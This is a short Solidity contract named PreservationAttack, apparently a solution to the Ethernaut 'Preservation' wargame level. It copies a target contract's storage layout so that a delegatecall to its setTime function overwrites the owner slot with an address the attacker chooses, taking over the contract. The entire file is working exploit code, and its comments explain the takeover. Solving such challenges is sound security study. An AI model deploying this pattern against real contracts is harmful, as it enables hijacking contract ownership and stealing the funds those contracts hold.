// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // Match the storage layout of Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    function setTime(uint256 _time) public {
        // When called via delegatecall, this will overwrite the owner slot (slot 2)
        // We'll pass our desired owner address as _time
        owner = address(uint160(_time));
    }
}